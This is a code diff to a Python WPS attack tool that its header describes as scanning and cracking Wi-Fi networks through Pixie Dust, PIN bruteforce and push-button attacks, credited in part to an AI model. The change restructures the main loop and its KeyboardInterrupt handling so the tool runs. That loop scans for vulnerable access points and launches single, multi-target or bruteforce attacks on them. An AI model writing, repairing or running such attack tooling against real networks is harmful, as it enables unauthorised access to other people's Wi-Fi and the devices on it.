@@ -1,5 +1,12 @@
+```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+# trieupham 0.0.3 (c) 2023 rofl0r, drygdryg modded by vladimir127001, enhanced by Grok
+# A WPS attack tool for scanning and cracking Wi-Fi networks with WPS enabled
+# Requires root privileges and Python 3.6+
+# Supports Pixie Dust attack, bruteforce, and push-button connection
+# Fixed syntax errors ('break' and 'continue') for compatibility
+
 import sys
 import subprocess
 import os
@@ -969,51 +976,53 @@ if __name__ == '__main__':
     companion = None
     try:
         while True:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose, threads=args.threads,
-                                  battery_threshold=args.battery_threshold, max_attempts=args.max_attempts, use_gui=args.gui)
-            if args.pbc:
-                companion.single_connection(pbc_mode=True)
-            else:
-                if not args.bssid:
-                    try:
-                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                            vuln_list = file.read().splitlines()
-                    except FileNotFoundError:
-                        vuln_list = []
-                    scanner = WiFiScanner(args.interface, vuln_list)
-                    if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                    if args.multi_ap:
-                        bssids = scanner.prompt_network(multi_ap=True, max_targets=3)
-                    else:
-                        bssids = [scanner.prompt_network()]
+            try:
+                companion = Companion(args.interface, args.write, print_debug=args.verbose, threads=args.threads,
+                                      battery_threshold=args.battery_threshold, max_attempts=args.max_attempts, use_gui=args.gui)
+                if args.pbc:
+                    companion.single_connection(pbc_mode=True)
                 else:
-                    bssids = [args.bssid]
-
-                if bssids:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose, threads=args.threads,
-                                          battery_threshold=args.battery_threshold, max_attempts=args.max_attempts, use_gui=args.gui)
-                    if args.multi_ap:
-                        companion.attack_multi_ap(bssids, args.pixie_dust, args.show_pixie_cmd, args.pixie_force)
-                    elif args.bruteforce:
-                        companion.smart_bruteforce(bssids[0], args.pin, args.delay, args.threads)
+                    if not args.bssid:
+                        try:
+                            with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                                vuln_list = file.read().splitlines()
+                        except FileNotFoundError:
+                            vuln_list = []
+                        scanner = WiFiScanner(args.interface, vuln_list)
+                        if not args.loop:
+                            print('[*] BSSID not specified (--bssid) — scanning for available networks')
+                        if args.multi_ap:
+                            bssids = scanner.prompt_network(multi_ap=True, max_targets=3)
+                        else:
+                            bssids = [scanner.prompt_network()]
                     else:
-                        companion.single_connection(bssids[0], args.pin, args.pixie_dust,
-                                                    args.show_pixie_cmd, args.pixie_force)
+                        bssids = [args.bssid]
+
+                    if bssids:
+                        companion = Companion(args.interface, args.write, print_debug=args.verbose, threads=args.threads,
+                                              battery_threshold=args.battery_threshold, max_attempts=args.max_attempts, use_gui=args.gui)
+                        if args.multi_ap:
+                            companion.attack_multi_ap(bssids, args.pixie_dust, args.show_pixie_cmd, args.pixie_force)
+                        elif args.bruteforce:
+                            companion.smart_bruteforce(bssids[0], args.pin, args.delay, args.threads)
+                        else:
+                            companion.single_connection(bssids[0], args.pin, args.pixie_dust,
+                                                        args.show_pixie_cmd, args.pixie_force)
                 if not args.loop:
                     break
                 args.bssid = None
-    except KeyboardInterrupt:
-        print("\n[!] Aborted by user")
-        if args.loop:
-            choice = input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower()
-            if choice == 'y':
-                print("Exiting…")
-            else:
-                args.bssid = None
-                continue  # Continue to next iteration of the loop
-        else:
-            print("Exiting…")
+            except KeyboardInterrupt:
+                print("\n[!] Aborted by user")
+                if args.loop:
+                    choice = input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower()
+                    if choice == 'y':
+                        print("Exiting…")
+                        break
+                    args.bssid = None
+                    continue
+                else:
+                    print("Exiting…")
+                    break
     finally:
         if companion:
             companion.cleanup()
@@ -1023,3 +1032,4 @@ if __name__ == '__main__':
 
     if args.mtk_wifi:
         wmtWifi_device.write_text("0")
+```
